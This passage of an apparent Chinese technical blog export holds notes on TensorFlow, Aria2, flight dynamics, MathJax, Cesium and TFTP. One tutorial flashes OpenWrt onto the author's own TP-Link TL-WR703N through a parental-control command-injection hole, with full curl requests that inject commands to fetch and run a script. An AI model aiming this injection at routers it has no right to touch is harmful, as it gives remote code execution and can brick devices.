dtype=tf.float32)b = tf.Variable(np.random.randn(), name=&quot;bias&quot;, dtype=tf.float32)def inference(X): # 计算推断模型在数据X上的输出，并将结果返回 pred = tf.add(tf.multiply(W, X), b) return preddef loss(X,Y): # 依据训练数据X及其期望输出Y计算损失 pred = tf.add(tf.multiply(W, X), b) cost = tf.reduce_sum(tf.pow(pred-Y, 2)) / data_count return costdef inputs(): # 读取或生成训练数据X及其期望输出Y x_data = np.linspace(-20, 20, data_count) y_data = np.multiply(4, x_data) + 7 + np.random.normal(loc=0, scale=8.0, size=(data_count,)) return (x_data,y_data)def train(total_loss): # 依据计算的总损失训练或调整模型参数 optimizer = tf.train.GradientDescentOptimizer(learning_rate).minimize(total_loss) return optimizer def evaluate(sess,X,Y): # 对训练得到的模型进行评估 # 因为是线性回归，这里只图示 plt.figure(figsize=(10, 6)) plt.scatter(X, Y, s=10, color=&apos;g&apos;) pred=inference(X) plt.plot(X, sess.run(pred)) plt.title(&apos;y=4x+7&apos;) plt.xlabel(&apos;x&apos;) plt.ylabel(&apos;y&apos;) plt.show() # 在一个会话对象中启动数据流图，搭建流程with tf.Session() as sess: tf.initialize_all_variables().run() X,Y=inputs() total_loss=loss(X,Y) train_op=train(total_loss) coord=tf.train.Coordinator() threads=tf.train.start_queue_runners(sess=sess,coord=coord) for step in range(training_steps): sess.run([train_op]) # 出于调试和学习的目的，查看损失在训练过程中递减的情况 if step % 10 ==0: print(&quot;loss: &quot;,sess.run([total_loss])) evaluate(sess,X,Y) coord.request_stop() coord.join(threads) sess.close() 参考文献 线性回归, by wikipedia. 重拾基础 - 线性回归（一）, by Cerulean.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源跨平台下载利器Aria2]]></title>
    <url>%2F2019%2F01%2F07%2F%E5%BC%80%E6%BA%90%E8%B7%A8%E5%B9%B3%E5%8F%B0%E4%B8%8B%E8%BD%BD%E5%88%A9%E5%99%A8Aria2%2F</url>
    <content type="text"><![CDATA[长期以来，迅雷一直是我在Windows平台上首选的下载工具。但是随着迅雷软件升级更新后的下载限速和广告推销的愈演愈烈，我终于下定决心卸载了它。下面我推荐一款开源跨平台的下载利器Aria2。 Aria2简介Aria2是一款自由、跨平台命令行界面的下载管理器，该软件根据GPLv2许可证进行分发。支持的下载协议有：HTTP、HTTPS、FTP、Bittorrent和Metalink。 不同于Wget这样的的命令行界面下载器，Aria2不仅支持BitTorrent，还能够从各种来源多路检索所请求的文件。包括HTTP，HTTPS，FTP和BitTorrent协议。aria2使用Metalink数据块的校验和自动查验BitTorrent下载的数据部分。 安装配置从Aria2官网下载最新Aria2安装包，当前Aria2最新的版本为1.34.0。 将下载的Aria2安装包aria2-1.34.0-win-64bit-build1解压到C盘目录，并将Aria2安装目录添加到Windows环境变量PATH。 重启后，打开Windows终端，即可在命令行中使用Aria2下载文件。 使用帮助从Web中下载文件： 1aria2c http://example.org/mylinux.iso 从2个源下载文件： 1aria2c http://a/f.iso ftp://b/f.iso 使用2个连接下载文件：1aria2c -x2 http://a/f.iso BitTorrent下载：1aria2c http://example.org/mylinux.torrent BitTorrent Magnet URI下载：1aria2c &apos;magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&apos; 按照txt中给出的URI下载：1aria2c -i uris.txt 参考链接 Aria2,by wikipedia. Aria2 Homepage,by Aria2.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[飞行仿真之刚体六自由度方程]]></title>
    <url>%2F2019%2F01%2F06%2F%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F%E4%B9%8B%E5%88%9A%E4%BD%93%E5%85%AD%E8%87%AA%E7%94%B1%E5%BA%A6%E6%96%B9%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[在飞行仿真中，获取飞机的位姿是基本要求。将飞行器视为刚体，根据牛顿第二定律和动量矩定理，即可推导出飞机的质心运动方程和飞机绕质心转动的动力学方程，即刚体的六自由度方程。下面即从《航空飞行器飞行动力学》中摘抄刚体六自由度方程的推导过程。 飞行器质心运动方程根据牛顿第二定理： m\frac{dV}{dt}=F \tag{1}式中$m$为飞行器质量，$V$为飞行器飞行速度矢量，$F$为作用于质心处外力的合力矢量。 具体研究飞行器质心运动规律时，工程上常建立投影正在一动坐标系的标量方程，并认为大气时静止的。 一般动坐标系中质心动力学方程取原点位于飞行器质心的一动坐标系$Oxyz$，它相对惯性坐标系$O_gx_gy_gz_g$有一转动角速度$w$。质心的绝对速度为$V$，如图1所示。 图1 动系相对于惯性坐标系的关系 将速度$V$和角速度$w$分别在动坐标系上投影，则有 $$V=V_xi+V_yj+V_zk \tag{2}$$ $$w=w_xi+w_yj+w_zk \tag{3}$$ 式中$i,j,k$为动坐标系$Oxyz$的单位矢量。由于$w$存在，其方向将随时间变化。 将公式$(2)和(3)$带入公式$(1)$，则速度$V$的微分，即质心的绝对加速度为： $$ \frac{F}{m}=\frac{dV}{dt}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k+V_x\frac{di}{dt}+V_y\frac{dj}{dt}+V_z\frac{dk}{dt} \tag{4} $$ 式中单位矢量导数$di/dt$是矢量端点$i$的速度，此时矢端曲线是绕$w$旋转的圆，因此： $$\frac{di}{dt}=w\times i$$ $$\frac{dy}{dt}=w\times y$$ $$\frac{dz}{dt}=w\times z$$ 将上述关系代入公式$(4)$，即可知质心的绝对加速度可表示为 $$\frac{F}{m}=\frac{dV}{dt}=\frac{\delta V}{\delta t}+w \times V \tag{5}$$ 其中： $$\frac{\delta V}{\delta t}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k$$ 式$(5)$中$\frac{\delta V}{\delta t}$为动系角速度$w=0$时的加速度，即相当于观察者站在动坐标系中所看到的质心加速度；$w\times V$为由于存在角速度$w$使$V$相对于动坐标系方向发生变化而产生的加速度；$\frac{dV}{dt}$为质心的绝对加速度，即观察者在地面坐标系上所看到的加速度。 同样合力矢量$F$用动坐标系上投影表示为： $$F=F_xi+F_yj+F_zk$$ 于是式(5)在动坐标系$Oxyz$上投影的质心动力学标量方程如下： $$m(\frac{dV_x}{dt}+V_zw_y-V_yw_z)=F_x$$ $$m(\frac{dV_y}{dt}+V_xw_z-V_zw_x)=F_y$$ $$m(\frac{dV_z}{dt}+V_yw_x-V_xw_y)=F_z$$ 上述方程组适用于任何动坐标系。 # 飞行器绕质心的动力学方程 根据动量矩定理，飞行器绕质心的转动运动可表示为： $$M=\frac{dh}{dt} \tag{6}$$ 式中$h$为飞行器对坐标系原点的动量矩；$M$为作用在飞行器上的外力对原点的合力矩。 图2 对质心的动量矩 根据动量矩定义，飞行器上任意微元质量为dm，对坐标系原点的动量矩为： \Delta h=r\times V dm式中$r$为微元质量到坐标系原点的矢径；$V$为该微元质量的速度矢量，则 V=V_o+w\times r式中$V_o$为坐标系原点速度（如坐标原点取为飞行器质心，则为质心速度）；$w$为坐标系转动角速度。 于是飞行器的总动量矩可积分得出 h=\int r\times V dm=\int r dm \times V_o +\int r \times (w \times r) dm取坐标系原点为质心时，有 \int r dm=0飞行器动量矩简化为 h=\int r \times (w\times r) dm \tag{7}上式表明，飞行器的动量矩只取决于转动产生的速度部分，而与质心运动速度$V_o$无关。矢径$r$和角速度$w$用坐标系中投影分量表示为： r=xi+yj+zkw=w_xi+w_yj+w_zk将上述关系式代入式$(7)$，经整理得： h_x=w_xI_x-w_yI_{xy}-w_zI_{zx}h_y=w_yI_y-w_xI_{xy}-w_zI_{yx}h_z=w_zI_z-w_xI_{zx}-w_yI_{yz}式中$I_x,I_y,I_z$分别为飞行器对$Ox轴,Oy轴,Oz轴$地惯性矩，分别为： I_x=\int (y^2+z^2) dmI_y=\int (x^2+z^2) dmI_z=\int (x^2+y^2) dm而$I{xy},I{yz},I_{zx}$则为对$Ox轴与Oy轴$，$Oy轴与Oz轴$，$Oz轴与Ox轴$的惯性积，分别为 I_{xy}=\int xy dmI_{yz}=\int yz dmI_{zx}=\int zx dm一般动坐标系中绕质心转动动力学方程具体研究飞行器绕质心转动规律时，矢量形式的式$(6)$使用不便。工程习惯上将其投影在一动坐标系上建成方程的标量形式。此时动坐标系在空中以$w$转动，类同于加速度$\frac{dV}{dt}$，动量矩可以表示为： M=\frac{dh}{dt}=\frac{\delta h}{\delta t}+w\times h类似一般动坐标系中质心动力学方程的推导，最终可得转动运动方程的标量形式为： m(\frac{dh_x}{dt}+h_zw_y-h_yw_z)=F_xm(\frac{dh_y}{dt}+h_xw_z-h_zw_x)=F_ym(\frac{dh_z}{dt}+h_yw_x-h_xw_y)=F_z参考文献 方振平,陈万春,张曙光. 航空飞行器飞行动力学[M]. 2015.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行力学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MathJax语法笔记]]></title>
    <url>%2F2019%2F01%2F05%2FMathJax%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MathJax是一个跨浏览器的JavaScript库，它使用MathML、LaTeX和ASCIIMathML标记在Web浏览器中显示数学符号。MathJax是在Apache许可证下作为开源软件发布的。 安装MathJaxMathJax有三种安装方式：最简单的方法就是使用分布式网络服务中的MathJax的副本，它位于 cdn.mathjax.org ,但是你也可以下载并安装一个MathJax的副本到你的服务器,或者使用在你本地硬盘的副本（这样是不需要使用网络）。 官方文档里有详细的描述。 MathJax语法如何插入公式LaTeX的数学公式有两种：行中公式和独立公式。行中公式放在文中与其它文字混编，独立公式单独成行。 行中公式可以用如下两种方法表示： (数学公式) 或 $数学公式$ 独立公式可以用如下两种方法表示： [数学公式] 或 $$数学公式$$ 打Tag和引用公式如果在某个公式之后，又想要引用原公式并说明原公式的出处，可以用 tagging/labelling/referencing system来做。 可以用 \tag{yourtag} 来给原公式打 Tag。 m\frac{dV}{dt}=F \tag{1}如果在后面需要引用它，就在 \tag 后面加上 \label{somelabel}，yourtag 和 somelabel不一定要一样，但最好一样。 参考链接 MathJax, by wikipedia. MathJax使用LaTeX语法编写数学公式教程, by knight. MathJax Home, by mathjax.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown语法笔记]]></title>
    <url>%2F2019%2F01%2F05%2FMarkdown%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[一直使用Markdown编辑文档，偶尔会遇到使用一些特殊Markdown语法，为了防止遗忘，特在此记录一下。 强调在Markdown中，可以使用 * 和 _ 表示斜体，用 ** 表示加粗。例如： Coding，让开发更简单 Coding，让开发更简单 Coding，让开发更简单 引用Markdown 标记区块引用和 email 中用 『&gt;』的引用方式类似，只需要在整个段落的第一行最前面加上 『&gt;』 ： Coding.net 为软件开发者提供基于云计算技术的软件开发平台，包括项目管理，代码托管，运行空间和质量控制等等。 区块引用可以嵌套，只要根据层次加上不同数量的『&gt;』： 这是第一级引用。 这是第二级引用。 现在回到第一级引用。 参考链接 Markdown 语法介绍, by coding.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向量点积叉积及其几何意义]]></title>
    <url>%2F2019%2F01%2F05%2F%E5%90%91%E9%87%8F%E7%82%B9%E7%A7%AF%E5%8F%89%E7%A7%AF%E5%8F%8A%E5%85%B6%E5%87%A0%E4%BD%95%E6%84%8F%E4%B9%89%2F</url>
    <content type="text"><![CDATA[在3D游戏开发中，经常用到向量的点积和叉积及其几何意义，为防止遗忘，在此记录一下。 点积在数学中，点积（德语：Skalarprodukt、英语：Dot Product）又称数量积或标量积（德语：Skalarprodukt、英语：Scalar Product），是一种接受两个等长的数字序列（通常是坐标向量）、返回单个数字的代数运算。在欧几里得几何中，两个笛卡尔坐标向量的点积常称为内积（德语：inneres Produkt、英语：Inner Product），见内积空间。 定义点积有两种定义方式：代数方式和几何方式。通过在欧氏空间中引入笛卡尔坐标系，向量之间的点积既可以由向量坐标的代数运算得出，也可以通过引入两个向量的长度和角度等几何概念来求解。 代数定义两个向量 $\vec{a} = [a1, a2,…, an]$和 $\vec{b} = [b1, b2,…, bn]$的点积定义为： \vec{a}\cdot \vec{b} = \sum_{i=1}^n a_ib_i = a_1b_1 + a_2b_2 + \cdots + a_nb_n这里的Σ是求和符号，而n是向量空间的维数。 几何定义在欧几里得空间中，点积可以直观地定义为 \vec{a} \cdot \vec{b} = |\vec{a}| \, |\vec{b}| \cos \theta \;这里 $|\vec{x}|$ 表示 $\vec{x}$的模（长度）， $\theta$ 表示两个向量之间的角度。 叉积在数学和向量代数领域，叉积（英语：Cross product）又称向量积（英语：Vector product），是对三维空间中的两个向量的二元运算，使用符号 $\times$。与点积不同，它的运算结果是向量。对于线性无关的两个向量 $\mathbf {a}$ 和 $\mathbf {b}$ ，它们的叉积写作 ${\mathbf {a} \times \mathbf {b} }$，是 $\mathbf {a}$ 和 $\mathbf {b}$ 所在平面的法线向量，与 $\mathbf {a}$ 和 $\mathbf {b}$ 都垂直。叉积被广泛运用于数学、物理、工程学、计算机科学领域。 定义两个向量 $\mathbf {a}$ 和 $\mathbf {b}$ 的叉积仅在三维空间中有定义，写作 ${\displaystyle \mathbf {a} \times \mathbf {b} }$。在物理学中，叉积有时也被写成${\displaystyle \mathbf {a} \wedge \mathbf {b} }$，但在数学中 ${\displaystyle \mathbf {a} \wedge \mathbf {b} }$ 是外代数中的外积。 叉积 ${\displaystyle \mathbf {a} \times \mathbf {b} }$ 是与 $\mathbf {a}$ 和 $\mathbf {b}$ 都垂直的向量 $\mathbf {c}$ 。其方向由右手定则决定，模长等于以两个向量为边的平行四边形的面积。 叉积可以定义为： {\displaystyle \mathbf {a} \times \mathbf {b} =\|\mathbf {a} \|\|\mathbf {b} \|\sin(\theta )\ \mathbf {n} }其中$\theta$ 表示 $\mathbf {a}$ 和 $\mathbf {b}$ 在它们所定义的平面上的夹角（ ${\displaystyle 0^{\circ }\leq \theta \leq 180^{\circ }}$）。 ${\displaystyle |\mathbf {a} |}$ 和 ${\displaystyle |\mathbf {b} |}$ 是向量$\mathbf {a}$ 和 $\mathbf {b}$ 的模长，而 $\mathbf{n}$ 则是一个与 $\mathbf {a}$ 、 $\mathbf {b}$ 所构成的平面垂直的单位向量，方向由右手定则决定。根据上述公式，当$\mathbf {a}$ 与 $\mathbf {b}$ 平行（即 $\theta$ 为 0° 或 180°）时，它们的叉积为零向量 $\mathbf{0}$。 矩阵表示叉积可以表达为这样的行列式： {\displaystyle \mathbf {u\times v} ={\begin{vmatrix}\mathbf {i} &\mathbf {j} &\mathbf {k} \\u_{1}&u_{2}&u_{3}\\v_{1}&v_{2}&v_{3}\\\end{vmatrix}}}这个行列式可以使用萨吕法则或拉普拉斯展开计算。使用拉普拉斯展开可以沿第一行展开为： {\displaystyle {\begin{aligned}\mathbf {u\times v} &={\begin{vmatrix}u_{2}&u_{3}\\v_{2}&v_{3}\end{vmatrix}}\mathbf {i} -{\begin{vmatrix}u_{1}&u_{3}\\v_{1}&v_{3}\end{vmatrix}}\mathbf {j} +{\begin{vmatrix}u_{1}&u_{2}\\v_{1}&v_{2}\end{vmatrix}}\mathbf {k} \\&=(u_{2}v_{3}-u_{3}v_{2})\mathbf {i} -(u_{1}v_{3}-u_{3}v_{1})\mathbf {j} +(u_{1}v_{2}-u_{2}v_{1})\mathbf {k} \end{aligned}}}可以直接得到结果向量。 参考链接 叉积, by wikipedia. 数量积, by wikipedia. 向量点乘（内积）和叉乘（外积、向量积）概念及几何意义解读, by -牧野-.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python批量重命名文件]]></title>
    <url>%2F2019%2F01%2F01%2FPython%E6%89%B9%E9%87%8F%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[最近从iData中下载了很多学术论文，这些论文文件名都以“www.cn-ki.net_”开头，一个个重命名太麻烦，于是使用如下python3脚本批量重命名文件。123456789101112131415161718192021222324# Python3 code to rename multiple # files in a directory or folder # importing os module import os # Function to rename multiple files def main(): # search file in current directory for filename in os.listdir(&quot;.&quot;): if os.path.isfile(filename): if &quot;www.cn-ki.net_&quot; in filename[0:14]: src=filename dst=filename[14:] # rename the special file os.rename(src, dst) # Driver Code if __name__ == &apos;__main__&apos;: # Calling main() function main()]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TL-WR703N版本v1.7刷openwrt教程]]></title>
    <url>%2F2018%2F12%2F31%2FTL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。 准备工作 一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n 1# 在刷机之前，按reset按钮重置路由器 TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin 1234# 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）curl https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bindd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576 TFTP 服务器 12# 安装TFTP的客户端和服务器端sudo apt-get install atftp atftpd busybox 1.16.1 MIPS 版 1curl https://busybox.net/downloads/binaries/1.21.1/busybox-mips &gt; busybox 编写Hack脚本 12345678cd /tmptftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的iptftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来chmod 755 busybox # 修改busybox权限以执行命令./busybox dd if=i1 of=/dev/mtdblock1 conv=fsync # 将i1写入磁盘分区./busybox dd if=i2 of=/dev/mtdblock2 conv=fsync # 将i2写入磁盘分区reboot -f # 重启，会启动openwrt 刷机流程在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。 搭建tftp服务器在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。 Hack into TL-WR703N这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。 【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。 步骤如下： 长按reboot按钮将路由器恢复出厂设置 将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100 在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码 12# 此处修改密码为admin42，注意Cookies中认证变量Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true&apos; &apos;http://192.168.1.1/&apos; 启用家长控制（利用漏洞） 1curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&apos; --referer &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm&apos; &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&amp;parent_mac_addr=00-00-00-00-00-02&amp;Page=1&apos; 让路由器从tftp服务器下载并执行脚本12# 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿curl -o - -b &apos;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=&apos; --referer &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&amp;Page=1&apos; &apos;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&amp;lan_lists=888&amp;url_comment=test&amp;url_0=;cd%20/tmp;&amp;url_1=;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2=;sh%20aa;&amp;url_3=&amp;url_4=&amp;url_5=&amp;url_6=&amp;url_7=&amp;scheds_lists=255&amp;enable=1&amp;Changed=1&amp;SelIndex=0&amp;Page=1&amp;rule_mode=0&amp;Save=%B1%A3+%B4%E6&apos; openwrt系统配置openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。 参考链接 给 v1.7 版本的 TL-WR703N 刷 openwrt,by Cubic Zone. TL-WR703N v1.7刷openwrt,by 梦里茶. TP-Link TL-WR703N,by openwrt. Debian安装配置使用TFTP,by jack huang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian安装配置使用TFTP]]></title>
    <url>%2F2018%2F12%2F30%2FDebian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP%2F</url>
    <content type="text"><![CDATA[简单文件传输协议也称小型文件传输协议（Trivial File Transfer Protocol, TFTP），是一种简化的文件传输协议（FTP），通过少量存储器就能轻松实现。 TFTP技术信息小型文件传输协议的一些详细资料： 使用UDP（端口69）作为其传输协议（不像FTP使用TCP端口21）。 不能列出目录内容。 无验证或加密机制。 被用于在远程服务器上读取或写入文件。 支持三种不同的传输模式：”netascii”,”octet”和”mail”，前两种匹配FTP协议中的”ASCII”和”image（binary）”模式；第三种从来很少使用，当前已经废弃。 TFTP安装安装TFTP的客户端和服务器端：1sudo apt-get install atftp atftpd TFTP配置 创建TFTP服务器目录 123sudo mkdir /tftpbootsudo chmod 777 /tftpbootsudo chmod 777 /tftpboot/* 编辑TFTP配置文件 12345sudo gedit /etc/default/atftpd# 修改内容如下，主要是修改目录USE_INETD=falseOPTIONS=&quot;--daemon --port 69 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot; 重启TFTP守护程序 1sudo /etc/init.d/atftpd restart TFTP测试123456789~$ sudo tftp 192.168.43.116tftp&gt; statusConnected to 192.168.43.116.Mode: netascii Verbose: off Tracing: offRexmt-interval: 5 seconds, Max-timeout: 25 secondstftp&gt; get iproad.txtReceived 959 bytes in 0.0 secondstftp&gt; put upload.txtSent 13 bytes in 0.0 seconds 参考链接 TFTP,by wikipedia. Using TFTP to Install Malicious Software on the Target,by kail forum.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium中3D模型的驱动方法]]></title>
    <url>%2F2018%2F12%2F26%2FCesium%E4%B8%AD3D%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%A9%B1%E5%8A%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Cesium中3D模型的运动可以使用CZML直接驱动，但使用该方法前提是能事先计算出3D模型的运动轨迹，具有很大的局限性。那么如何实时驱动3D模型呢？ Cesium渲染过程分析Cesium渲染过程的分析可以参考链接1。Cesium的渲染始于虚拟地球组件CesiumWidget的startRenderLoop方法，在该方法中将调用requestAnimationFrame函数开始渲染。 虚拟地球组件CesiumWidget包含Scene组件，在其render方法随后调用Scene的render方法。在场景组件Scene的render方法中提供了preUpdate、postUpdate、preRender、postRender四个事件对象，这四个事件对象将是我们实时驱动3D模型的关键。 preUpdate事件在Cesium更新渲染周期开始之前以目标帧率触发preUpdate事件。 123456scene.postUpdate.addEventListener(function() &#123; // This code will run at 60 FPS if (changeToPromptRender) &#123; scene.requestRender(); &#125;&#125;); postUpdate事件在场景更新之后，新帧渲染之前以目标帧率触发postUpdate事件。 preRender事件在场景更新之后，新帧渲染之前触发preRender事件。 1234scene.preRender.addEventListener(function() &#123; // This code will run when a new frame is rendered // including when changeToPromptRender is true&#125;); postRender事件在新帧渲染之后触发postRender事件。 实时驱动3D模型从上一节对Cesium渲染过程分析可知，要实时驱动3D模型，应订阅场景Scene的preUpdate事件，在preUpdate事件的处理函数中改变3D模型的位置和姿态。 订阅preUpdate事件123456789101112131415//订阅场景的preUpdate事件viewer.scene.preUpdate.addEventListener(function(scene, time) &#123; speedVector = Cesium.Cartesian3.multiplyByScalar(Cesium.Cartesian3.UNIT_X, speed / 10, speedVector); position = Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, speedVector, position); pathPosition.addSample(Cesium.JulianDate.now(), position); Cesium.Transforms.headingPitchRollToFixedFrame(position, hpRoll, Cesium.Ellipsoid.WGS84, fixedFrameTransform, planePrimitive.modelMatrix); if (fromBehind.checked) &#123; // Zoom to model Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, planePrimitive.boundingSphere.center, center); hpRange.heading = hpRoll.heading; hpRange.pitch = hpRoll.pitch; camera.lookAt(center, hpRange); &#125;&#125;); 获取czml实体的参数1234567891011121314151617viewer.scene.preUpdate.addEventListener(function(scene, time) &#123; //target是czml实体对象 //获取time时刻target的位置参数 target.position.getValue(time,position) console.log(position) target.orientation.getValue(time,orientation) console.log(orientation)&#125;);viewer.scene.preUpdate.addEventListener(function(scene, time) &#123; var pos=target.position.getValue(time) console.log(pos.toString()) //世界坐标转经纬高 var cartographicPosition = Cesium.Ellipsoid.WGS84.cartesianToCartographic(pos); console.log(cartographicPosition.toString())&#125;); 使用Entity API加载3D模型1234567891011121314151617var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;);var center=Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);var hpr=Cesium.HeadingPitchRoll.fromDegrees(90,-90,0);//从headingPitchRoll转四元数var quatern=Cesium.Transforms.headingPitchRollQuaternion(center,hpr);var entity = viewer.entities.add(&#123; position :center , orientation:quatern , model : &#123; uri : &apos;../../../../Apps/SampleData/models/missile.glb&apos;, scale: 0.1, minimumPixelSize:50, maximumScale:5000 &#125;&#125;);viewer.trackedEntity = entity; 使用Primitive API加载3d模型123456789101112var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;);var center1=Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);var hpr1=Cesium.HeadingPitchRoll.fromDegrees(90,-90,100);//计算模式矩阵，实现本地坐标系坐标到世界坐标系坐标的转换var modelMatrix=Cesium.Transforms.headingPitchRollToFixedFrame(center1, hpr1)var model = viewer.scene.primitives.add(Cesium.Model.fromGltf(&#123; url : &apos;../../../../Apps/SampleData/models/missile.glb&apos;, modelMatrix : modelMatrix, scale : 1.0&#125;)); 参考链接 Cesium摄像头跟踪飞机实体时晃动问题分析,by jack huang. Improving Performance with Explicit Rendering, by Gabby Getz.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全攻防技术探讨]]></title>
    <url>%2F2018%2F12%2F22%2FWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E6%8E%A2%E8%AE%A8%2F</url>
    <content type="text"><![CDATA[网络安全（英语：network security）包含网络设备安全、网络信息安全、网络软件安全。在此重点探讨网络软件安全中的Web安全。当前Web安全面临的压力越来越大，一方面是Web应用一统江湖，君临天下，另一方面针对Web应用的攻击越来越多，攻击方法越来越成熟。下面重点介绍常见的Web攻击方法。 XSSXSS (Cross Site Script，跨站脚本攻击)的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。 非持久型 XSS持久型 XSSCSRFCSRF（Cross-Site Request Forgery,跨站请求伪造攻击）可以盗用你的登陆信息，以你的身份模拟发送各种请求。 SQL 注入SQL 注入漏洞（SQL Injection）是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。 命令行注入命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令。 DDoS 攻击DDoS 又叫分布式拒绝服务，全称 Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用。 网络层 DDoS应用层 DDoS流量劫持流量劫持是黑产行业的一大经济支柱。 DNS 劫持HTTP 劫持参考链接 Advanced web security topics,by George. 网络安全,by wikipedia. 常见 Web 安全攻防总结,by zoumiaojiang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
